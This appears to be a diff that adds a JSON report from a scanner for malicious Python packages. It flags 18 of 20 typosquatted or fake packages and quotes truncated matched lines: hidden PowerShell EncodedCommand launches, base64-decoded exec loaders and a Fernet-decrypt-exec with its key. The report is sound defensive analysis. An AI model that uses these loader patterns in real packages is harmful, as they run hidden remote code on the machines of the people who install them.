@@ -1,0 +1,636 @@
+{
+  "total": 20,
+  "malicious_count": 18,
+  "safe_count": 1,
+  "error_count": 1,
+  "detection_rate": 0.9,
+  "malicious_samples": [
+    {
+      "name": "selfnvidiapynvidia-4.41",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\selfnvidiapynvidia-4.41.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "powershell_encoded_command",
+          "description": "PowerShell隐藏编码命令攻击",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "hidden_powershell",
+          "description": "PowerShell隐藏窗口攻击",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "encoded_command",
+          "description": "编码命令参数",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        }
+      ],
+      "critical": 1,
+      "high": 2
+    },
+    {
+      "name": "fuzywuzy-4.5.2",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\fuzywuzy-4.5.2.tar.gz",
+      "issues": [
+        {
+          "severity": "high",
+          "pattern": "custom_install_command",
+          "description": "自定义install命令（可能在install时执行恶意代码）",
+          "line": 33,
+          "matched_text": "cmdclass={'install': PostInstallCommand},"
+        }
+      ],
+      "critical": 0,
+      "high": 1
+    },
+    {
+      "name": "esqguipippost-2.7",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\esqguipippost-2.7.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "powershell_encoded_command",
+          "description": "PowerShell隐藏编码命令攻击",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB"
+        },
+        {
+          "severity": "high",
+          "pattern": "hidden_powershell",
+          "description": "PowerShell隐藏窗口攻击",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB"
+        },
+        {
+          "severity": "high",
+          "pattern": "encoded_command",
+          "description": "编码命令参数",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB"
+        }
+      ],
+      "critical": 1,
+      "high": 2
+    },
+    {
+      "name": "libmcpep-8.44",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\libmcpep-8.44.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "powershell_encoded_command",
+          "description": "PowerShell隐藏编码命令攻击",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "hidden_powershell",
+          "description": "PowerShell隐藏窗口攻击",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "encoded_command",
+          "description": "编码命令参数",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        }
+      ],
+      "critical": 1,
+      "high": 2
+    },
+    {
+      "name": "selfloadnvidiapip-10.46",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\selfloadnvidiapip-10.46.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "powershell_encoded_command",
+          "description": "PowerShell隐藏编码命令攻击",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "hidden_powershell",
+          "description": "PowerShell隐藏窗口攻击",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "encoded_command",
+          "description": "编码命令参数",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        }
+      ],
+      "critical": 1,
+      "high": 2
+    },
+    {
+      "name": "ro-py-wrapper-2.0.10",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\ro-py-wrapper-2.0.10.tar.gz",
+      "issues": [
+        {
+          "severity": "high",
+          "pattern": "base64_exec_combo",
+          "description": "Base64解码后执行",
+          "line": 21,
+          "matched_text": "exec(base64.b64decode(\"ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0IG9zCmltcG9ydCBzeXMKCnVybCA9ICJod"
+        }
+      ],
+      "critical": 0,
+      "high": 1
+    },
+    {
+      "name": "liblibsuperad-5.46",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\liblibsuperad-5.46.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "powershell_encoded_command",
+          "description": "PowerShell隐藏编码命令攻击",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "hidden_powershell",
+          "description": "PowerShell隐藏窗口攻击",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "encoded_command",
+          "description": "编码命令参数",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        }
+      ],
+      "critical": 1,
+      "high": 2
+    },
+    {
+      "name": "tphydraintel-7.78",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\tphydraintel-7.78.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "powershell_encoded_command",
+          "description": "PowerShell隐藏编码命令攻击",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "hidden_powershell",
+          "description": "PowerShell隐藏窗口攻击",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "encoded_command",
+          "description": "编码命令参数",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        }
+      ],
+      "critical": 1,
+      "high": 2
+    },
+    {
+      "name": "selfvirtualpippong-8.96",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\selfvirtualpippong-8.96.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "powershell_encoded_command",
+          "description": "PowerShell隐藏编码命令攻击",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "hidden_powershell",
+          "description": "PowerShell隐藏窗口攻击",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "encoded_command",
+          "description": "编码命令参数",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        }
+      ],
+      "critical": 1,
+      "high": 2
+    },
+    {
+      "name": "esqadintel-7.66",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\esqadintel-7.66.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "powershell_encoded_command",
+          "description": "PowerShell隐藏编码命令攻击",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "hidden_powershell",
+          "description": "PowerShell隐藏窗口攻击",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "encoded_command",
+          "description": "编码命令参数",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        }
+      ],
+      "critical": 1,
+      "high": 2
+    },
+    {
+      "name": "esqrandompushgrand-3.28",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\esqrandompushgrand-3.28.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "powershell_encoded_command",
+          "description": "PowerShell隐藏编码命令攻击",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "hidden_powershell",
+          "description": "PowerShell隐藏窗口攻击",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "encoded_command",
+          "description": "编码命令参数",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        }
+      ],
+      "critical": 1,
+      "high": 2
+    },
+    {
+      "name": "virtualstudy-10.85",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\virtualstudy-10.85.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "powershell_encoded_command",
+          "description": "PowerShell隐藏编码命令攻击",
+          "line": 7,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "hidden_powershell",
+          "description": "PowerShell隐藏窗口攻击",
+          "line": 7,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "encoded_command",
+          "description": "编码命令参数",
+          "line": 7,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        }
+      ],
+      "critical": 1,
+      "high": 2
+    },
+    {
+      "name": "libguistrmc-8.57",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\libguistrmc-8.57.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "powershell_encoded_command",
+          "description": "PowerShell隐藏编码命令攻击",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "hidden_powershell",
+          "description": "PowerShell隐藏窗口攻击",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "encoded_command",
+          "description": "编码命令参数",
+          "line": 8,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        }
+      ],
+      "critical": 1,
+      "high": 2
+    },
+    {
+      "name": "tppywlibpep-9.48",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\tppywlibpep-9.48.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "powershell_encoded_command",
+          "description": "PowerShell隐藏编码命令攻击",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "hidden_powershell",
+          "description": "PowerShell隐藏窗口攻击",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "encoded_command",
+          "description": "编码命令参数",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        }
+      ],
+      "critical": 1,
+      "high": 2
+    },
+    {
+      "name": "py-nvidiapaypalsuper-1.77",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\py-nvidiapaypalsuper-1.77.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "powershell_encoded_command",
+          "description": "PowerShell隐藏编码命令攻击",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "hidden_powershell",
+          "description": "PowerShell隐藏窗口攻击",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "encoded_command",
+          "description": "编码命令参数",
+          "line": 9,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        }
+      ],
+      "critical": 1,
+      "high": 2
+    },
+    {
+      "name": "postvisa-6.83",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\postvisa-6.83.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "powershell_encoded_command",
+          "description": "PowerShell隐藏编码命令攻击",
+          "line": 7,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "hidden_powershell",
+          "description": "PowerShell隐藏窗口攻击",
+          "line": 7,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "encoded_command",
+          "description": "编码命令参数",
+          "line": 7,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        }
+      ],
+      "critical": 1,
+      "high": 2
+    },
+    {
+      "name": "beautifuksoup-1.0.0",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\beautifuksoup-1.0.0.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "obfuscated_code",
+          "description": "可疑的混淆函数调用（20+字符标识符）",
+          "line": 10,
+          "matched_text": "class iDIAcPBhsGpcDfJzuLzWmQVNAItyTjITwuAlgHKlwAiXHhkEHaybFoxQsFzYTRfWGeqXPXMwRxWFRAnUEFNqeNMoILcyeW"
+        },
+        {
+          "severity": "critical",
+          "pattern": "fernet_decrypt_exec",
+          "description": "Fernet解密并执行（oenesea攻击模式）",
+          "line": 16,
+          "matched_text": "exec(Fernet(b'Jannjp_a-Er7_jGCNBxs4zrDtJW5TR3mp7iW4iTIDrA=').decrypt(b'gAAAAABmBH4iYepF8wwoubakDp9Ff"
+        }
+      ],
+      "critical": 2,
+      "high": 0
+    },
+    {
+      "name": "intnvidia-3.81",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\intnvidia-3.81.tar.gz",
+      "issues": [
+        {
+          "severity": "critical",
+          "pattern": "powershell_encoded_command",
+          "description": "PowerShell隐藏编码命令攻击",
+          "line": 7,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "hidden_powershell",
+          "description": "PowerShell隐藏窗口攻击",
+          "line": 7,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        },
+        {
+          "severity": "high",
+          "pattern": "encoded_command",
+          "description": "编码命令参数",
+          "line": 7,
+          "matched_text": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB"
+        }
+      ],
+      "critical": 1,
+      "high": 2
+    }
+  ],
+  "safe_samples": [
+    {
+      "name": "bytedtrace-0.3.4",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\bytedtrace-0.3.4.tar.gz"
+    }
+  ],
+  "errors": [
+    {
+      "name": "pythoncolorv4-1.0.0-py3-none-any",
+      "tar_gz": "C:\\Users\\85864\\Downloads\\output_line(1)\\0-50\\pythoncolorv4-1.0.0-py3-none-any.tar.gz"
+    }
+  ],
+  "execution_results": [
+    {
+      "package": "selfnvidiapynvidia-4.41",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "fuzywuzy-4.5.2",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "esqguipippost-2.7",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "libmcpep-8.44",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "selfloadnvidiapip-10.46",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "ro-py-wrapper-2.0.10",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "liblibsuperad-5.46",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "tphydraintel-7.78",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "selfvirtualpippong-8.96",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "esqadintel-7.66",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "esqrandompushgrand-3.28",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "virtualstudy-10.85",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "libguistrmc-8.57",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "tppywlibpep-9.48",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "py-nvidiapaypalsuper-1.77",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "postvisa-6.83",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "beautifuksoup-1.0.0",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    },
+    {
+      "package": "intnvidia-3.81",
+      "stub": null,
+      "result": {
+        "error": "no_stub"
+      }
+    }
+  ]
+}
